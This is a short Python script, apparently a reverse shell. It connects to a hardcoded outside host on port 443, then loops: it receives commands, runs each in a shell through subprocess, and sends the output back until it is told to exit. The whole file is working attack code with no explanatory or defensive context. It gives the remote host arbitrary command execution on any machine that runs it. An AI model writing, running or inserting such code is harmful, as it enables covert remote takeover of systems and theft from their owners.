import socket
import subprocess

def connectionZ(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    
    while True:
        command = s.recv(1024).decode()
        if command.lower() == "exit":
            break
            
        output = subprocess.run(command, shell=True, 
                               capture_output=True, text=True)
        s.send(output.stdout.encode() + output.stderr.encode())
    
    s.close()

if __name__ == "__main__":
    connectionZ("s.inty.io", 443)
